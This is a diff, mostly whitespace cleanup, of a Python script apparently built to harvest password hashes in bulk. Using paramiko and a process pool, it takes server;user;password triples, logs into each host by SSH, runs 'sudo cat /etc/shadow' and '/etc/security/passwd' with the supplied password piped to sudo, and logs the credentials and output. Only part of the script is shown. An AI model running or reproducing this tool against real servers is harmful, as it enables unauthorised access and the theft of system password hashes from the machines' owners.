@@ -1,5 +1,4 @@
 # coding: utf-8
-
 import multiprocessing
 from functools import partial
 import paramiko
@@ -12,13 +11,12 @@ import os
 
 debug = True
 
-
 def dEcho(text):
+	
 	global debug
 	if debug:
 		print("[DEBUG] %s" % text)
-
-
+		
 def isSSHOpen(server,port):
 
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -29,7 +27,6 @@ def isSSHOpen(server,port):
 		return True
 	except:
 		return False
-
 
 def getSSHShadow(server_address,server_username,server_pass):
 
@@ -53,10 +50,7 @@ def getSSHShadow(server_address,server_username,server_pass):
 		session = ssh.get_transport().open_session()
 		connected = True
 		
-
-		logging.info('[%s] [%s:%s] - SSH connected!' % (server_address,server_username,server_pass))
-
-		
+		logging.info('[%s] [%s:%s] - SSH connected!' % (server_address,server_username,server_pass))		
 		session.set_combine_stderr(True)
 		session.get_pty()
 		session.exec_command("sudo /bin/cat /etc/shadow;sudo /usr/bin/cat /etc/security/passwd")
@@ -64,8 +58,7 @@ def getSSHShadow(server_address,server_username,server_pass):
 		stdout = session.makefile('rb', -1)
 		stdin.write(server_pass + '\n')
 		stdin.flush()
-
-
+		
 		endtime = time.time() + 10
 		while not stdout.channel.eof_received:
 			time.sleep(1)
@@ -92,23 +85,22 @@ def getSSHShadow(server_address,server_username,server_pass):
 	return True
 
 def doSSHStuff(user,server):
+	
 	print(server)
 	print(user)
 
-
 def doPreparationSSHStuff(block):
-
+	
 	server = block.split(";")[0]
 	user = block.split(";")[1]
 	password = block.split(";")[2]
-
 	#print('[%s] [%s:%s] - Starting' % (server,user,password))
 	getSSHShadow(server,user,password)
 
 def update_progress(progress):
+	
 	sys.stdout.write('\r[{0}] {1}%'.format('█'*(progress/5),progress))
 	sys.stdout.flush()
-
 
 def main(users,servers,threads):
 
@@ -132,11 +124,9 @@ def main(users,servers,threads):
 			update_progress(int(100-percentage))
 
 		time.sleep(1)
-
 	pool.close()
 	pool.join()
 	
-
 if __name__ == '__main__':
 
 	os.system("clear")
@@ -152,7 +142,7 @@ if __name__ == '__main__':
 	user_file = ""
 	server_file = ""
 	s = 0
-
+	
 	if len(sys.argv) >= 3:
 		for option in sys.argv:
 			if option == "-u":
